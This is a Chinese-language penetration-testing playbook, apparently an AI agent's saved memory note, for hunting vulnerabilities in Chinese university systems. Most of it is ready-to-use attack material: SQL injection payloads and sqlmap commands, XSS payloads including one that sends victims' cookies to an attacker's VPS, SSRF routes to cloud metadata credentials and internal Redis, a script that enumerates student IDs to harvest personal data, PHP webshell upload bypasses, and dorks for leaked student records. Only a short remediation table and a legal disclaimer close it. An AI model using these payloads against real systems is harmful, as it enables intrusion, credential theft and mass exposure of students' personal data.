---
name: EDU-SRC 通用漏洞实战技巧
description: 教育行业通用漏洞挖掘、SQL/XSS/SSRF/越权/上传等实战
type: reference
originSessionId: ee20960f-1d7b-4892-a567-02767c979e0a
---
# EDU-SRC 通用漏洞实战技巧

## 一、SQL注入在教育行业的应用

### 1.1 教育特有注入点

高校教务系统（正方、强智、青果、URP）是SQL注入的重灾区，以下为高概率注入点：

| 系统类型 | 常见注入位置 | 典型参数 |
|---------|------------|---------|
| 正方教务系统 | 成绩查询 `/xscj/xxcj_cxXscjList.html` | `xh`、`xnxq`、`xqm` |
| 强智教务系统 | 课表查询、登录接口 | `studentId`、`userName` |
| URP教务系统 | 学籍信息查询 | `studentId`、`id`、`sid` |
| 青果教务系统 | 成绩/考务模块 | `id`、`type`、`classId` |
| 选课系统 | 选课操作、课表展示 | `courseId`、`termId` |
| 在线考试系统 | 题库查询、答题提交 | `questionId`、`paperId` |
| 统一身份认证 | CAS登录接口 | `username`、`service` |
| 图书馆系统 | 图书检索、预约 | `keyword`、`bookId` |
| 学工系统 | 奖学金申请、助学金 | `studentId`、`applyId` |
| 一卡通系统 | 消费查询、余额查询 | `cardNo`、`userId` |

### 1.2 教育系统特有注入手法

**1) 宽字节注入（GBK编码的教务系统）**
- 场景：老牌正方/强智系统，数据库采用GBK编码，`addslashes()` 防注入
- Payload：`%df%27` 吃掉转义反斜杠，如 `学号=%df%27 UNION SELECT ... --+`
- 关键：检测页面编码是否为 `gbk/gb2312`，在请求头或HTML meta中查看

**2) POST参数注入（成绩查询接口）**
- 教务系统的查询多为POST提交JSON或表单
- 抓包后用 `sqlmap -r request.txt --batch --level 3 -p xh`
- 常用技巧：将 `xh=2023001` 改为 `xh=2023001' AND 1=1--+` 看页面差异

**3) 搜索框模糊查询注入**
- 教育网站搜索框常用 `LIKE` 查询拼接，易注入
- Payload：`xxx%' AND 1=1--+` 或 `xxx%' AND SLEEP(5)--+`

**4) 时间盲注（教务系统最实用）**
- 教务系统不显示详细错误，通用时间盲注最稳定
- Payload：`id=1' AND IF(SUBSTR(VERSION(),1,1)=5, SLEEP(5), 0)--+`
- sqlmap参数：`--technique T --time-sec 5 --level 3`

### 1.3 sqlmap专项参数

```bash
# 教育系统通用（POST请求）
python <workdir>/tools/sqlmap-1.8/sqlmap.py -r request.txt --batch --technique B/E/U/T -p xh --string "查询成功" --random-agent --level 3

# 时间盲注专用
python <workdir>/tools/sqlmap-1.8/sqlmap.py -r request.txt --batch --technique T --time-sec 5 -p id

# 宽字节注入专用
python <workdir>/tools/sqlmap-1.8/sqlmap.py -r request.txt --batch --technique B/T -p username --charset=gbk --tamper unmagicquotes

# 带Cookie认证
python <workdir>/tools/sqlmap-1.8/sqlmap.py -u "http://jwgl.example.edu.cn/xscj/query" --cookie="ASP.NET_SessionId=xxx" --data="xh=2023001&xnxq=2024-2025-1" --batch
```

### 1.4 手工探测流程

1. 注册/登录教务系统（使用学号）
2. 进入成绩查询页面，Burp抓取POST请求
3. 逐个参数加 `'` 和 `' AND 1=1--+` 测试回显差异
4. 有差异则确认注入点，用sqlmap自动化
5. 无回显差异 → 时间盲注测试 `SLEEP(5)`
6. 确定 `--technique` 类型后跑库/表/列/数据

---

## 二、XSS挖掘技巧

### 2.1 教育系统存储型XSS高发位置

| 模块 | 具体场景 | 触发角色 | 危害等级 |
|-----|---------|---------|---------|
| 考试系统 | 题干、选项、答案解析（富文本） | 学生答题时触发 / 教师评阅时触发 | 高 |
| 课程讨论区 | 发帖、回帖、评论 | 所有浏览帖子的用户 | 极高（蠕虫风险） |
| 作业互评 | 评语内容 | 教师评阅时触发 | 高 |
| 个人简介/签名 | 个人信息编辑 | 管理员后台查看时触发 | 高（盲打） |
| 教师评教 | 评教内容 | 教师/管理员查看 | 高（盲打管理端） |
| 在线答疑 | 提问、回答 | 师生浏览 | 中-高 |
| 头像/附件上传 | SVG/HTML文件上传 | 访问附件链接 | 高 |
| 通知公告 | 发布通知内容（富文本） | 全校师生 | 极高 |
| 站内信/消息 | 发送消息内容 | 收件人阅读 | 高 |

### 2.2 经典Payload合集

**基础标签类**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**富文本编辑器绕过（UEditor/KindEditor/TinyMCE）**
```html
<!-- UEditor video标签白名单绕过 -->
<video src=x onerror=alert(1)>

<!-- MathML嵌套绕过 -->
<math><mtext><table><mglyph><svg><mtext><table><mglyph><svg><style><!--</style><img src=1 onerror=alert(1)>

<!-- a标签事件 -->
<a onmouseover=alert(1) href="#">link</a>

<!-- details autofocus -->
<details open ontoggle=eval(name)>
```

**上传SVG-XSS**
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
```

**盲打Payload（XSS平台回调）**
```html
<img src=x onerror="new Image().src='http://你的VPS/steal?cookie='+document.cookie">
<script>new Image().src='http://VPS/'+document.cookie</script>
```

### 2.3 WAF绕过技巧（教育站常见云WAF）

| 绕过方式 | Payload示例 |
|---------|------------|
| 标签截断换行 | `<img\nsrc=x\nonerror=alert(1)>` |
| HTML实体编码 | `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` |
| 双写绕过 | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| Unicode编码 | `<img src=x onerror="alert(1)">` |
| Base64编码 | `<img src=x onerror="eval(atob('YWxlcnQoMSk='))">` |
| 伪协议 | `<iframe src=javascript:alert(1)>` |

### 2.4 自动化挖掘流程

1. 用Burp抓取所有POST请求，找出含 `content/body/message/description/reason` 等参数
2. 修改参数为 `<details open ontoggle=alert(1)>` 提交
3. 查看返回页面是否将Payload存入HTML且未转义
4. 用两个浏览器验证：一个提交，另一个打开列表页/详情页看是否执行
5. 对富文本编辑器重点测试 `video`、`embed`、`a`、`details`、`svg`、`math` 标签

---

## 三、SSRF利用

### 3.1 教育系统SSRF高发场景

| 功能模块 | 漏洞入口 | 典型参数 |
|---------|---------|---------|
| 课件/视频URL下载 | 远程资源抓取 | `url`、`file`、`path`、`src` |
| 头像外链 | 用户头像URL设置 | `avatar_url`、`pic`、`image` |
| 富文本编辑器远程图片 | 远程图片抓取（UEditor catchimage） | `source[]`、`imgUrl` |
| 图书馆电子书跳转 | 外部链接跳转 | `target`、`redirect`、`goto` |
| CAS统一认证 | 回调URL解析 | `service`、`callback`、`redirect_uri` |
| 支付回调 | 支付通知 | `notify_url`、`return_url` |
| 短信/邮件发送 | 验证码服务 | `endpoint`、`api_url` |
| 云打印服务 | 打印URL提交 | `doc_url`、`file_url` |

### 3.2 云元数据获取（核心利用链）

**云平台元数据端点**
```http
# 阿里云
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/

# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

# 华为云
http://169.254.169.254/latest/meta-data/

# 百度云
http://169.254.169.254/latest/meta-data/
```

### 3.3 内网探测常用地址

```http
# 内网网段扫描
http://10.0.0.1/admin
http://10.10.0.1:6379/    # Redis未授权
http://10.10.0.1:3306/    # MySQL
http://10.10.0.1:9200/    # ElasticSearch
http://10.10.0.1:27017/   # MongoDB
http://10.10.0.1:8080/    # 内网Web管理
http://10.10.0.1:22/      # SSH
http://10.10.0.1:3389/    # RDP

# 常见内网段
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

### 3.4 协议扩展利用

```http
# Gopher协议 - 攻击内网Redis
gopher://内网IP:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a... 

# Dict协议 - 端口探测
dict://内网IP:6379/info

# File协议 - 读文件
file:///etc/passwd
file:///C:/Windows/win.ini

# Phar协议 - 反序列化
phar://test.phar
```

### 3.5 绕过技巧

| 方式 | 说明 | 示例 |
|-----|------|------|
| IPv6混合 | 用IPv6表示IPv4 | `http://[::ffff:100.100.100.200]/` |
| 短地址跳转 | 利用短地址302跳转 | `http://短地址 -> http://169.254.169.254/` |
| 302跳转 | 在自己的VPS上302跳转到内网 | 自建302跳转服务 |
| URL解析差异 | `http://evil.com@169.254.169.254/` | 利用@符号解析差异 |
| 十进制IP | `http://2852039166/` = `169.254.169.254` | IPv4转十进制 |
| DNS重绑定 | 第一次解析到合法IP，第二次到内网 | DNS Rebinding技术 |

### 3.6 教育SSRF实战利用链

```
发现SSRF入口（如UEditor catchimage）
  → 探测云元数据（100.100.100.200）
    → 获取AccessKey/SecretKey
      → 接管云存储/云主机
        → 内网横向移动
          → 攻击内网Redis/MySQL/ES
```

---

## 四、越权/IDOR

### 4.1 教育系统IDOR高发接口

#### 水平越权（可遍历批量获取）

| 系统模块 | 接口路径 | 可遍历参数 |
|---------|---------|-----------|
| 成绩查询 | `/academic/grade/query` | `studentId`、`xh` |
| 学生信息 | `/wechat/student/info` | `id`、`stuId` |
| 课表查询 | `/academic/schedule` | `studentId`、`classId` |
| 一卡通消费 | `/card/consume/query` | `cardNo`、`userId` |
| 考勤记录 | `/attendance/record` | `studentId` |
| 奖惩文件 | `/down/file/download` | `id`（遍历下载） |
| 选课记录 | `/api/course/enrolled` | `studentId` |
| 论文/作业 | `/assignment/submit/files` | `assignmentId`、`userId` |
| 考试座位 | `/exam/seat/query` | `studentId` |
| 宿舍信息 | `/dormitory/info` | `studentId`、`roomNo` |

#### 垂直越权（低权限访问高权限接口）

| 场景 | 权限提升 | 接口示例 |
|------|---------|---------|
| 普通学生查看教师后台 | student→teacher | `/admin/course/manage` |
| 用户查看管理后台 | user→admin | `/manager/system/userlist` |
| 未登录访问需鉴权接口 | guest→user | `/api/personal/data` |
| 普通教师查看全校数据 | teacher→admin | `/academic/all/grades` |

### 4.2 教育系统IDOR特征

1. **学号可预测**：`2023XXXXXX` 结构，后几位连续递增
2. **ID为自增数字**：`id=1,2,3...` 极易遍历
3. **前端鉴权迷信**：前端隐藏按钮，后端未校验
4. **API未绑定用户**：参数传什么就返回什么
5. **缺少角色校验**：同一接口学生和教师都能访问但数据权限不同

### 4.3 Burp批量测试步骤

```
1. 登录系统抓取请求，找到含ID参数的接口
2. 修改ID参数为其他值（当前学号+1、+2等）
3. 查看是否返回其他用户的数据
4. 确认存在IDOR后，用Intruder批量遍历
5. Intruder设置：Payload类型为Numbers，从起始学号到结束学号
6. 用Grep - Extract提取响应中的关键信息（姓名、身份证、成绩）
```

### 4.4 批量获取数据脚本模板

```python
import requests

cookies = {"ASP.NET_SessionId": "xxx"}
base_url = "http://jwgl.example.edu.cn/student/info?id="

for sid in range(2023001, 2023100):
    r = requests.get(base_url + str(sid), cookies=cookies)
    if "姓名" in r.text:
        print(f"[+] 存在用户: {sid}")
        # 提取关键信息
```

---

## 五、文件上传绕过

### 5.1 教育系统常见上传组件及漏洞

| 组件 | 版本 | 已知漏洞/绕过 |
|------|------|-------------|
| UEditor（百度编辑器） | v1.4.x | `catchimage` SSRF+上传、`config.json` 后缀白名单不全 |
| KindEditor | v4.x | `upload_json.asp` 上传绕过、`fileManagerJson` 目录遍历 |
| FCKeditor | 老版本 | 未严格过滤后缀、直接上传 `.php/.asp` |
| 正方教务系统 | 各版本 | 头像上传、附件上传过滤不严 |
| 在线考试系统 | 自研 | 图片上传接口 Content-Type 校验绕过 |
| 网课/直播系统 | 自研 | 课件上传、资料上传未做文件内容检测 |

### 5.2 绕过手法大全

**1) Content-Type 绕过**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----
...
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg              ← 修改为图片MIME
```

**2) 扩展名绕过**
```
大小写:      .PHP .Php .Asp .jSp .aSpX
双重扩展:   shell.php.jpg  shell.php;.jpg
特殊扩展:   .php5 .pht .phtml .php7 .php8
IIS扩展:    .asa .cer .cdx
Apache:     .php.xxx（解析漏洞）
```

**3) 图片马/文件头绕过**
```
GIF:   GIF89a
PNG:   \x89PNG
JPEG:  \xFF\xD8\xFF\xE0
在文件头后插入: <?php @eval($_POST['c']);?>
```

**4) 解析漏洞利用**
```
Apache解析漏洞: shell.php.rar → 被解析为PHP
Nginx CGI解析: shell.jpg/xxx.php → 以PHP解析
IIS 6.0: 建立 shell.asp 目录，目录下所有文件解析为ASP
```

**5) .htaccess / web.config 绕过**
```apache
# .htaccess - 让目录下所有jpg以PHP执行
AddType application/x-httpd-php .jpg
```

**6) 条件竞争绕过**
- 场景：上传后检测，检测到非图片则删除
- 手法：上传Webshell的同时持续访问，在删除前完成执行

### 5.3 教育系统上传绕过优先级

```
1. 检查编辑器版本（UEditor/KindEditor > 自研上传）
2. 测试 Content-Type 修改（最简单有效）
3. 测试扩展名大小写/双重扩展
4. 测试图片马（文件头 + Webshell）
5. 测试 .htaccess 上传
6. 测试解析漏洞（Apache/Nginx/IIS）
```

---

## 六、敏感信息泄露

### 6.1 GitHub泄露挖掘（教育行业重灾区）

**GitHub Dork 关键词**
```
# 教务系统源码
"教务系统" site:github.com
"学号" "身份证" site:github.com
"学生信息管理系统" AND "password" site:github.com

# 配置文件泄露
"application.yml" ".edu.cn"
"database.jdbc.url" ".edu.cn"
"jdbc:mysql" "edu.cn" "password"

# 数据库备份
"学生信息.sql" site:github.com
"教务系统备份.sql"
"students.sql" site:github.com

# 关键文件
".env" ".edu.cn"
"config.php" "edu.cn" "db_password"
```

**自动化工具**
- TruffleHog：扫描高熵值字符串（密钥、Token）
- GitLeaks：检测硬编码的敏感信息
- GitGuardian：扫描公开仓库中的凭证

**历史提交痕迹**
- 即使文件在当前版本被删除，Git历史中仍保留
- `git clone` 后用 `git grep "password\|secret"` 搜索所有历史

### 6.2 Google Dork 教育信息泄露

```
site:edu.cn filetype:xls 学生 信息
site:edu.cn filetype:pdf 身份证
site:edu.cn intitle:index.of "学生"
site:edu.cn inurl:phpmyadmin
site:edu.cn inurl:login "admin" "password"
site:edu.cn ext:sql 备份 学生
site:edu.cn "phpinfo()"
site:edu.cn inurl:web.config
```

### 6.3 教育系统常见泄露数据类型

| 数据类型 | 泄露方式 | 危害等级 |
|---------|---------|---------|
| 学号+姓名+身份证 | 数据库备份、CSV导出 | 极高 |
| 数据库连接信息 | 配置文件（.env, application.yml） | 极高 |
| 云平台AccessKey | 代码硬编码 | 极高（云上接管） |
| 学生成绩/绩点 | API未鉴权 | 中-高 |
| 教职工工号/手机号 | 数据导出 | 高 |
| 系统管理员密码 | 默认密码/弱密码 | 极高 |
| 短信/邮件API Key | 配置文件泄露 | 高 |
| OSS存储桶文件列表 | 云存储配置错误 | 高 |

### 6.4 自动化挖掘工具链

```
1. FOFA/Hunter资产收集: body="edu.cn" && body="教务系统"
2. GitHub Dorking: 搜索泄露的配置/源码/数据库
3. Google Dorking: 搜索暴露的敏感文件
4. 子域名收集: OneForAll/Subfinder扫描 *.edu.cn
5. JS文件分析: 提取JS中的API Key、内网域名
6. 端口扫描: 发现未授权服务（Redis/ES/MongoDB等）
```

---

## 七、PoC/Checklist

### 7.1 SQL注入检测清单

- [ ] 成绩查询接口检测 `xh`、`id`、`studentId` 参数注入
- [ ] 登录接口检测 `username` 参数注入
- [ ] 课表查询接口检测所有参数
- [ ] 搜索框模糊查询 `LIKE` 注入
- [ ] 页面编码是否为GBK → 宽字节注入 `%df%27`
- [ ] 时间盲注测试 `SLEEP(5)`
- [ ] 报错注入测试 `AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))`
- [ ] sqlmap 指定 `--technique` 和 `--string`

### 7.2 XSS检测清单

- [ ] 考试系统题干/选项/答案解析（富文本）
- [ ] 课程讨论区发帖/回帖
- [ ] 作业互评评语
- [ ] 个人简介/签名档
- [ ] 教师评教内容
- [ ] 头像SVG上传XSS
- [ ] UEditor/KindEditor富文本绕过
- [ ] `<details open ontoggle>` 标签测试
- [ ] `<video><source onerror>` 测试
- [ ] MathML嵌套绕过测试

### 7.3 SSRF检测清单

- [ ] 头像外链URL参数测试
- [ ] 课件/视频下载URL测试
- [ ] UEditor `catchimage` 远程图片功能
- [ ] `url`、`file`、`path`、`src`、`redirect` 参数探测
- [ ] 云元数据端点探测（100.100.100.200）
- [ ] 内网端口探测（Redis 6379, MySQL 3306, ES 9200）
- [ ] 协议扩展测试（gopher:// dict:// file://）
- [ ] 302跳转绕过测试
- [ ] DNS重绑定绕过测试

### 7.4 越权/IDOR检测清单

- [ ] 成绩查询接口修改 `studentId` 遍历
- [ ] 学生信息接口遍历 `id` 参数
- [ ] 文件下载接口遍历 `id` 参数（批量下载）
- [ ] 选课接口测试替他人选课/退课
- [ ] 课后接口测试垂直越权（student→teacher→admin）
- [ ] 修改请求方法（GET→POST）访问管理接口
- [ ] 修改Cookie/Token尝试越权
- [ ] 学号预测性遍历（2023XXXXXX递增）

### 7.5 文件上传检测清单

- [ ] UEditor版本检测及 `catchimage` 测试
- [ ] KindEditor `upload_json.asp` 测试
- [ ] Content-Type 修改为 `image/jpeg` 上传Webshell
- [ ] 扩展名大小写绕过（.PHP .Php .Asp）
- [ ] 双重扩展名（shell.php.jpg）
- [ ] 特殊扩展名（.php5 .pht .phtml .cer）
- [ ] 图片文件头+Webshell拼接
- [ ] .htaccess 上传测试
- [ ] 条件竞争绕过测试

### 7.6 敏感信息泄露检测清单

- [ ] GitHub搜索教务系统源码和配置
- [ ] GitHub搜索数据库备份文件
- [ ] GitHub搜索AccessKey和SecretKey
- [ ] Google Dork搜索敏感文档（xls/pdf/sql）
- [ ] JS文件分析提取内网API和Key
- [ ] FOFA/Hunter资产收集
- [ ] 子域名收集和端口扫描

### 7.7 通用测试Payload速查表

| 漏洞类型 | 测试Payload |
|---------|------------|
| SQL注入 | `'`、`' AND 1=1--+`、`id=1 SLEEP(5)` |
| XSS | `<img src=x onerror=alert(1)>`、`<details open ontoggle=alert(1)>` |
| SSRF | `http://100.100.100.200/latest/meta-data/` |
| IDOR | 修改ID参数为相邻值遍历 |
| 文件上传 | 修改Content-Type、添加文件头 |
| 路径遍历 | `../../../etc/passwd`、`../WEB-INF/web.xml` |

---

## 八、教育SRC通杀思路总结

### 8.1 教育系统弱点总结

1. **系统老旧**：大量高校仍使用10年前开发的ASP/PHP教务系统
2. **组件过时**：UEditor/KindEditor/Discuz等组件长期未更新
3. **代码泄露**：历届学生在GitHub上上传的课设、毕设代码
4. **默认配置**：大量系统使用默认密码、默认路径
5. **内网部署**：教育系统多部署在内网，安全防护薄弱
6. **学号规律**：学号为可预测的数字序列，利于IDOR批量

### 8.2 标准测试流程

```
信息收集阶段
  ├── FOFA/Hunter: body="edu.cn" && title="教务系统"
  ├── 子域名收集: *.edu.cn
  ├── GitHub Dork: 搜索泄露源码和配置
  ├── JS分析: 提取内网API和Key
  └── 端口扫描: 发现更多服务和接口

漏洞挖掘阶段（按优先级）
  ├── [P0] 敏感信息泄露（GitHub/Google Dork）
  ├── [P0] IDOR越权（学号遍历）
  ├── [P0] 文件上传（编辑器绕过）
  ├── [P1] SQL注入（成绩查询接口）
  ├── [P1] SSRF（云元数据+内网探测）
  └── [P2] XSS（存储型盲打）

利用阶段
  ├── SQL注入: sqlmap dump数据
  ├── SSRF: 获取云凭证 → 云上接管
  ├── 文件上传: Webshell → 服务器权限
  ├── IDOR: 批量获取学生/教师数据
  ├── XSS: 盲打管理后台 → Cookie劫持
  └── 信息泄露: 直接获取敏感数据
```

### 8.3 典型教育系统指纹识别

| 系统 | 指纹特征 | 路径特征 |
|------|---------|---------|
| 正方教务系统 | `Zhengfang`、`JWGL` | `/xs_main.aspx`、`/xscj/` |
| 强智教务系统 | `QiangZhi`、`JWWeb` | `/jwweb/`、`/default_old.aspx` |
| 青果教务系统 | `QingGuo`、`E-Net` | `/enets/`、`/qg_gl/` |
| URP教务系统 | `URP`、`URPMIS` | `/urp/`、`/cas/login` |
| 超星学习通 | `chaoxing`、`XueXiTong` | `/chaoxing/`、`/mooc/` |
| 智慧树 | `zhihuishu` | `/zhihuishu/` |
| UEditor | `ueditor` | `/ueditor/`、`/UEditor/` |
| KindEditor | `kindeditor` | `/kindeditor/`、`/KindEditor/` |
| Discuz论坛 | `Discuz!` | `/forum/`、`/bbs/` |
| 通达OA | `Tongda`、`OA` | `/td/`、`/general/` |

### 8.4 高危修复建议速查

| 漏洞 | 紧急修复措施 |
|------|------------|
| SQL注入 | 改用预编译SQL、禁用动态拼接 |
| XSS | 输出HTML实体编码、富文本启用白名单 |
| SSRF | 限制出站请求IP段、禁用危险协议（gopher/dict） |
| IDOR | 资源操作必须校验用户身份和权限 |
| 文件上传 | 白名单后缀、内容检测、上传目录禁止执行脚本 |
| 信息泄露 | GitHub扫描+自动下架、代码审计、配置文件中密钥纳入环境变量 |

---

> **附注**：本文件内容基于公开安全社区（FreeBuf、先知社区、安全客、Seebug、CNVD等）知识整理，仅供授权渗透测试和防御加固参考。未经授权的漏洞测试和利用行为均属违法。
